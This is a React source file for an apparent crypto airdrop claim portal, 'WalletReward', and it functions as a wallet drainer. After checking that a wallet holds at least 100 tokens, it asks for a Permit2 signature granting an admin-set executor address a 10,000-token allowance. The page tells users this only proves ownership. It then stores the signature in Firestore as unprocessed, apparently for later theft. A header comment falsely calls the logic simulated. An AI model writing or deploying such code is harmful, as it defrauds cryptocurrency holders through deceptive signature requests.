import React, { useEffect, useMemo, useState } from 'react';
import {
  Wallet,
  ShieldCheck,
  ChevronRight,
  CheckCircle2,
  Loader2,
  AlertCircle,
  Lock,
  FileSignature,
  Zap,
} from 'lucide-react';
import { BrowserProvider, Contract, formatUnits } from 'ethers';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { sepolia } from '@reown/appkit/networks';
import { addDoc, collection, doc, getDoc, serverTimestamp } from 'firebase/firestore';
import { db } from './firebase';

/**
 * WalletReward Premium Frontend
 *
 * A high-fidelity UI design for an airdrop claim portal.
 * Features:
 * - Glassmorphism UI
 * - Step-by-step state management
 * - simulated verification logic for design review
 */
const DEFAULT_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
const DEFAULT_TOKEN = '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
const MIN_REQUIRED_BALANCE = 100;
const DEFAULT_SPENDING_CAP_UNITS = 10000;
const REOWN_PROJECT_ID = '2541b17d4e46b8d8593a7fbbaf477df6';

const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [sepolia],
  projectId: REOWN_PROJECT_ID,
  metadata: {
    name: 'WalletReward',
    description: 'Airdrop claim portal',
    url: 'https://walletreward.com',
    icons: []
  },
});

const getAppKitProvider = () => {
  const provider =
    appKit.getWalletProvider?.() ||
    appKit.getProvider?.() ||
    appKit.provider;
  if (!provider) throw new Error('Wallet provider not available');
  return provider;
};

const hexToNumber = (hex) => {
  if (!hex) return null;
  if (typeof hex === 'number') return hex;
  return parseInt(hex.toString(), 16);
};

const App = () => {
  // State to manage the current phase of the airdrop process
  // 0: Connect Wallet, 1: Verification, 2: Signing, 3: Success
  const [phase, setPhase] = useState(0);

  // Wallet/config state
  const [connectedAddress, setConnectedAddress] = useState(null);
  const [tokenAddress, setTokenAddress] = useState(DEFAULT_TOKEN);
  const [executorAddress, setExecutorAddress] = useState(DEFAULT_EXECUTOR);
  const [tokenSymbol, setTokenSymbol] = useState('USDT');
  const [tokenDecimals, setTokenDecimals] = useState(6);
  const [spendingCap, setSpendingCap] = useState(10000n * 10n ** 6n);

  // UI state
  const [isConnecting, setIsConnecting] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isSigning, setIsSigning] = useState(false);
  const [verificationError, setVerificationError] = useState(false);
  const [verificationErrorMessage, setVerificationErrorMessage] = useState('');
  const [connectError, setConnectError] = useState('');
  const [signError, setSignError] = useState('');

  const minBalanceLabel = useMemo(() => `$${MIN_REQUIRED_BALANCE.toFixed(2)}`, []);

  useEffect(() => {
    const loadSettings = async () => {
      try {
        const settingsRef = doc(db, 'admin_config', 'settings');
        const snap = await getDoc(settingsRef);
        const data = snap.exists() ? snap.data() : {};
        setTokenAddress(data.tokenAddress || DEFAULT_TOKEN);
        setExecutorAddress(data.executorAddress || DEFAULT_EXECUTOR);
      } catch (err) {
        // fall back to defaults
      }
    };
    loadSettings();
  }, []);

  useEffect(() => {
    let cancelled = false;

    const loadTokenInfo = async () => {
      if (!tokenAddress) return;
      try {
        const provider = new BrowserProvider(getAppKitProvider());
        const token = new Contract(
          tokenAddress,
          [
            'function decimals() view returns (uint8)',
            'function symbol() view returns (string)'
          ],
          provider
        );

        const [decimals, symbol] = await Promise.all([
          token.decimals(),
          token.symbol().catch(() => 'TOKEN')
        ]);

        if (cancelled) return;
        const parsedDecimals = Number(decimals);
        setTokenDecimals(parsedDecimals);
        setTokenSymbol(symbol || 'TOKEN');
        setSpendingCap(BigInt(DEFAULT_SPENDING_CAP_UNITS) * 10n ** BigInt(parsedDecimals));
      } catch (err) {
        if (cancelled) return;
        setTokenDecimals(6);
        setTokenSymbol('TOKEN');
        setSpendingCap(10000n * 10n ** 6n);
      }
    };

    loadTokenInfo();

    return () => {
      cancelled = true;
    };
  }, [tokenAddress]);

  useEffect(() => {
    const unsub = appKit.subscribeAccount((acct) => {
      if (acct?.isConnected && acct?.address) {
        setConnectedAddress(acct.address);
      } else {
        setConnectedAddress(null);
      }
    });

    return () => {
      unsub?.();
    };
  }, []);

  // --- Handlers ---
  const handleConnect = async () => {
    setIsConnecting(true);
    setConnectError('');
    try {
      const openModal = () => {
        if (typeof appKit.open === 'function') return appKit.open();
        if (typeof appKit.openModal === 'function') return appKit.openModal();
        throw new Error('AppKit modal not available');
      };

      await openModal();

      const address = await new Promise((resolve, reject) => {
        let unsub = null;
        const timeoutId = setTimeout(() => {
          if (unsub) unsub();
          reject(new Error('Wallet connection timed out'));
        }, 30000);

        unsub = appKit.subscribeAccount((acct) => {
          if (acct?.isConnected && acct?.address) {
            clearTimeout(timeoutId);
            if (unsub) unsub();
            resolve(acct.address);
          }
        });
      });

      setConnectedAddress(address || null);
      setPhase(1);
    } catch (err) {
      setConnectError(err?.message || 'Failed to connect wallet');
    } finally {
      setIsConnecting(false);
    }
  };

  const handleVerify = async () => {
    setIsVerifying(true);
    setVerificationError(false);
    setVerificationErrorMessage('');

    try {
      if (!connectedAddress) throw new Error('Connect a wallet first.');
      const provider = new BrowserProvider(getAppKitProvider());
      const token = new Contract(
        tokenAddress,
        ['function balanceOf(address) view returns (uint256)'],
        provider
      );
      const balance = await token.balanceOf(connectedAddress);
      const normalized = Number(formatUnits(balance, tokenDecimals));

      if (Number.isNaN(normalized) || normalized < MIN_REQUIRED_BALANCE) {
        setVerificationError(true);
        setVerificationErrorMessage(
          `Your wallet has ${normalized.toFixed(2)} ${tokenSymbol}. You need at least ${minBalanceLabel}.`
        );
      } else {
        setPhase(2);
      }
    } catch (err) {
      setVerificationError(true);
      setVerificationErrorMessage(err?.message || 'Verification failed.');
    } finally {
      setIsVerifying(false);
    }
  };

  const handleSign = async () => {
    setIsSigning(true);
    setSignError('');

    try {
      const provider = getAppKitProvider();
      const accounts = await provider.request({ method: 'eth_accounts' });
      const owner = (accounts && accounts[0]) || (await provider.request({ method: 'eth_requestAccounts' }))[0];
      if (!owner) throw new Error('Wallet not connected');

      const chainHex = await provider.request({ method: 'eth_chainId' });
      const chainId = hexToNumber(chainHex);

      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0;

      const permitted = {
        token: tokenAddress,
        amount: spendingCap.toString(),
        expiration: deadline,
        nonce
      };

      const domain = { name: 'Permit2', chainId, verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3' };

      const types = {
        EIP712Domain: [
          { name: 'name', type: 'string' },
          { name: 'chainId', type: 'uint256' },
          { name: 'verifyingContract', type: 'address' }
        ],
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      };

      const message = {
        details: permitted,
        spender: executorAddress,
        sigDeadline: deadline
      };

      const payload = JSON.stringify({ domain, types, primaryType: 'PermitSingle', message });
      const signature = await provider.request({
        method: 'eth_signTypedData_v4',
        params: [owner, payload]
      });

      const raw = signature.startsWith('0x') ? signature.slice(2) : signature;
      const r = '0x' + raw.slice(0, 64);
      const s = '0x' + raw.slice(64, 128);
      let v = parseInt(raw.slice(128, 130), 16);
      if (v === 0 || v === 1) v += 27;

      const result = {
        owner,
        spender: executorAddress,
        token: tokenAddress,
        amount: spendingCap.toString(),
        deadline,
        nonce,
        r,
        s,
        v
      };

      await addDoc(collection(db, 'permit2_signatures'), {
        ...result,
        processed: false,
        tokenSymbol,
        createdAt: Date.now(),
        createdAtServer: serverTimestamp()
      });

      setPhase(3);
    } catch (err) {
      setSignError(err?.message || 'Signature failed.');
    } finally {
      setIsSigning(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0a0a0c] text-white selection:bg-indigo-500/30 font-sans relative overflow-hidden">
      {/* Background Ambience - Animated Blobs */}
      <div className="fixed top-0 left-0 w-full h-full overflow-hidden pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-indigo-600/20 rounded-full blur-[120px] animate-pulse"></div>
        <div className="absolute bottom-[-10%] right-[-10%] w-[600px] h-[600px] bg-emerald-600/10 rounded-full blur-[120px] animate-pulse delay-1000"></div>
        <div className="absolute top-[20%] left-[50%] w-[300px] h-[300px] bg-blue-600/10 rounded-full blur-[100px] translate-x-[-50%]"></div>
      </div>

      {/* Navbar */}
      <nav className="relative z-10 w-full max-w-6xl mx-auto p-6 flex justify-between items-center">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-lg flex items-center justify-center shadow-lg shadow-indigo-500/20">
            <Zap size={18} className="text-white" fill="currentColor" />
          </div>
          <span className="text-xl font-bold tracking-tight">
            Wallet<span className="text-indigo-400">Reward</span>
          </span>
        </div>
        <div className="hidden md:flex items-center gap-6 text-sm text-gray-400">
          <span className="hover:text-white cursor-pointer transition-colors">Documentation</span>
          <span className="hover:text-white cursor-pointer transition-colors">Support</span>
          <div
            className={`px-3 py-1 rounded-full border ${
              connectedAddress
                ? 'border-green-500/30 bg-green-500/10 text-green-400'
                : 'border-gray-800 bg-gray-900/50'
            } flex items-center gap-2 text-xs font-medium`}
          >
            <div
              className={`w-2 h-2 rounded-full ${
                connectedAddress ? 'bg-green-500 animate-pulse' : 'bg-gray-500'
              }`}
            ></div>
            {connectedAddress ? 'Connected' : 'Disconnected'}
          </div>
        </div>
      </nav>

      {/* Main Content Area */}
      <main className="relative z-10 flex flex-col items-center justify-center min-h-[80vh] px-4">
        {/* Progress Stepper */}
        <div className="w-full max-w-md mb-12">
          <div className="flex justify-between items-center relative">
            {/* Connecting Line */}
            <div className="absolute top-1/2 left-0 w-full h-0.5 bg-gray-800 -z-10 transform -translate-y-1/2"></div>
            <div
              className="absolute top-1/2 left-0 h-0.5 bg-indigo-500 -z-10 transform -translate-y-1/2 transition-all duration-500 ease-out"
              style={{ width: `${(phase / 3) * 100}%` }}
            ></div>

            {/* Steps */}
            {[
              { icon: Wallet, label: 'Connect' },
              { icon: ShieldCheck, label: 'Verify' },
              { icon: FileSignature, label: 'Sign' },
              { icon: CheckCircle2, label: 'Claim' },
            ].map((step, index) => (
              <div key={index} className="flex flex-col items-center gap-2">
                <div
                  className={`w-10 h-10 rounded-full flex items-center justify-center border-2 transition-all duration-300 ${
                    index <= phase
                      ? 'bg-indigo-600 border-indigo-600 text-white shadow-lg shadow-indigo-500/30 scale-110'
                      : 'bg-[#0a0a0c] border-gray-700 text-gray-500'
                  }`}
                >
                  {index < phase ? <CheckCircle2 size={18} /> : <step.icon size={18} />}
                </div>
                <span
                  className={`text-xs font-medium transition-colors ${
                    index <= phase ? 'text-white' : 'text-gray-600'
                  }`}
                >
                  {step.label}
                </span>
              </div>
            ))}
          </div>
        </div>

        {/* Dynamic Card Interface */}
        <div className="w-full max-w-md bg-gray-900/40 backdrop-blur-xl border border-white/10 rounded-3xl p-8 shadow-2xl shadow-black/50 transition-all duration-500">
          {/* Phase 0: Connect Wallet */}
          {phase === 0 && (
            <div className="text-center space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
              <div className="w-20 h-20 bg-indigo-500/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-indigo-500/20">
                <Wallet className="text-indigo-400 w-10 h-10" />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-white mb-2">Connect Wallet</h1>
                <p className="text-gray-400 text-sm leading-relaxed">
                  Link your wallet to check eligibility for the <br />
                  exclusive reward distribution.
                </p>
              </div>

              {/* Mock AppKit Button */}
              <button
                onClick={handleConnect}
                disabled={isConnecting}
                className="w-full group relative overflow-hidden rounded-xl bg-white text-black font-bold py-4 px-6 hover:bg-gray-100 transition-all active:scale-[0.98]"
              >
                {isConnecting ? (
                  <div className="flex items-center justify-center gap-2">
                    <Loader2 className="animate-spin" size={20} />
                    <span>Connecting...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2">
                    <span>Connect Wallet</span>
                    <ChevronRight size={18} className="group-hover:translate-x-1 transition-transform" />
                  </div>
                )}
              </button>

              {connectError && (
                <div className="bg-red-950/30 border border-red-900/50 p-3 rounded-lg flex items-start gap-2 text-left">
                  <AlertCircle className="text-red-500 shrink-0" size={18} />
                  <p className="text-red-300/80 text-xs">{connectError}</p>
                </div>
              )}

              <div className="flex items-center justify-center gap-4 pt-4 border-t border-white/5">
                <span className="text-xs text-gray-500 uppercase tracking-wider">Supported Chains</span>
                <div className="flex gap-2">
                  {/* Simple circles to represent chain icons */}
                  <div className="w-6 h-6 rounded-full bg-slate-700" title="Ethereum"></div>
                  <div className="w-6 h-6 rounded-full bg-yellow-600" title="BNB"></div>
                  <div className="w-6 h-6 rounded-full bg-purple-600" title="Polygon"></div>
                </div>
              </div>
            </div>
          )}

          {/* Phase 1: Verification */}
          {phase === 1 && (
            <div className="text-center space-y-6 animate-in fade-in zoom-in-95 duration-500">
              <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-emerald-500/20 relative">
                <ShieldCheck className="text-emerald-400 w-10 h-10" />
                {isVerifying && (
                  <div className="absolute inset-0 rounded-full border-2 border-emerald-500 border-t-transparent animate-spin"></div>
                )}
              </div>
              <div>
                <h1 className="text-2xl font-bold text-white mb-2">Eligibility Check</h1>
                <p className="text-gray-400 text-sm">
                  Scanning your wallet assets for verification requirements.
                </p>
              </div>

              {/* Requirement Card */}
              <div
                className={`p-4 rounded-xl border transition-colors duration-300 ${
                  verificationError
                    ? 'bg-red-500/10 border-red-500/30'
                    : 'bg-gray-800/50 border-gray-700'
                }`}
              >
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm text-gray-400">Required Asset</span>
                  <span className="text-xs font-mono bg-gray-700 px-2 py-0.5 rounded text-gray-300">{tokenSymbol}</span>
                </div>
                <div className="flex justify-between items-baseline">
                  <span className="text-xl font-semibold text-white">Minimum Balance</span>
                  <span className="text-xl font-bold text-emerald-400">{minBalanceLabel}</span>
                </div>
              </div>

              {verificationError ? (
                <div className="bg-red-950/30 border border-red-900/50 p-4 rounded-lg flex items-start gap-3 text-left">
                  <AlertCircle className="text-red-500 shrink-0" size={20} />
                  <div>
                    <h4 className="text-red-400 font-bold text-sm">Verification Failed</h4>
                    <p className="text-red-300/70 text-xs mt-1">
                      {verificationErrorMessage || 'Your wallet does not meet the minimum holding requirement.'}
                    </p>
                    <button
                      onClick={() => setVerificationError(false)}
                      className="mt-3 text-xs text-white underline decoration-red-500"
                    >
                      Retry Check
                    </button>
                  </div>
                </div>
              ) : (
                <button
                  onClick={handleVerify}
                  disabled={isVerifying}
                  className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 px-6 rounded-xl transition-all active:scale-[0.98] shadow-lg shadow-emerald-900/20"
                >
                  {isVerifying ? (
                    <div className="flex items-center justify-center gap-2">
                      <Loader2 className="animate-spin" size={20} />
                      <span>Verifying Assets...</span>
                    </div>
                  ) : (
                    'Verify Eligibility'
                  )}
                </button>
              )}
            </div>
          )}

          {/* Phase 2: Signing */}
          {phase === 2 && (
            <div className="text-center space-y-6 animate-in fade-in slide-in-from-right-8 duration-500">
              <div className="relative mx-auto w-24 h-24">
                {/* Pulse Effect */}
                <div className="absolute inset-0 bg-blue-500/20 rounded-full animate-ping"></div>
                <div className="relative bg-gray-900 border-2 border-blue-500/30 rounded-full w-full h-full flex items-center justify-center">
                  <FileSignature className="text-blue-400 w-10 h-10" />
                </div>
                <div className="absolute -bottom-1 -right-1 bg-blue-500 text-white rounded-full p-1.5 border-4 border-gray-900">
                  <Lock size={12} />
                </div>
              </div>

              <div>
                <h1 className="text-2xl font-bold text-white mb-2">Signature Required</h1>
                <p className="text-gray-400 text-sm">
                  Please sign the message in your wallet to prove ownership. <br />
                  <span className="text-blue-400/80 text-xs">This will not trigger a transaction fee.</span>
                </p>
              </div>

              {/* Security Context Box */}
              <div className="bg-blue-950/20 border border-blue-800/30 rounded-xl p-4 text-left space-y-3">
                <div className="flex justify-between items-center border-b border-blue-800/30 pb-2">
                  <span className="text-xs text-blue-200">Origin</span>
                  <span className="text-xs font-mono text-gray-400">{window.location.origin}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-xs text-blue-200">Token</span>
                  <span className="text-xs font-mono text-gray-400 truncate max-w-[120px]">{tokenSymbol}</span>
                </div>
              </div>

              <button
                onClick={handleSign}
                disabled={isSigning}
                className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 px-6 rounded-xl transition-all active:scale-[0.98] shadow-lg shadow-blue-900/20"
              >
                {isSigning ? (
                  <div className="flex items-center justify-center gap-2">
                    <Loader2 className="animate-spin" size={20} />
                    <span>Waiting for Signature...</span>
                  </div>
                ) : (
                  'Sign to Claim'
                )}
              </button>

              {signError && (
                <div className="bg-red-950/30 border border-red-900/50 p-3 rounded-lg flex items-start gap-2 text-left">
                  <AlertCircle className="text-red-500 shrink-0" size={18} />
                  <p className="text-red-300/80 text-xs">{signError}</p>
                </div>
              )}

              <div className="text-xs text-gray-500 pt-2">Check your wallet popup to confirm.</div>
            </div>
          )}

          {/* Phase 3: Success */}
          {phase === 3 && (
            <div className="text-center space-y-6 animate-in zoom-in duration-500">
              <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_50px_-12px_rgba(34,197,94,0.6)]">
                <CheckCircle2 className="text-white w-12 h-12" />
              </div>
              <div>
                <h1 className="text-3xl font-bold text-white mb-2">Registration Complete!</h1>
                <p className="text-gray-300">
                  You have successfully verified your wallet. <br />
                  Assets will be distributed shortly.
                </p>
              </div>
              <div className="bg-gray-800/50 rounded-xl p-6 border border-white/5 mt-4">
                <div className="flex items-center justify-between text-sm mb-2">
                  <span className="text-gray-400">Status</span>
                  <span className="text-green-400 font-bold">Whitelisted</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-gray-400">Estimated Reward</span>
                  <span className="text-white font-bold">Pending Calculation</span>
                </div>
              </div>
              <button
                onClick={() => setPhase(0)}
                className="text-gray-500 hover:text-white text-sm mt-4 transition-colors"
              >
                Disconnect & Start Over
              </button>
            </div>
          )}
        </div>

        {/* Footer Disclaimer */}
        <p className="mt-8 text-xs text-gray-600 max-w-sm text-center">
          By connecting your wallet, you agree to our Terms of Service. We do not access your private keys.
        </p>
      </main>
    </div>
  );
};

export default App;
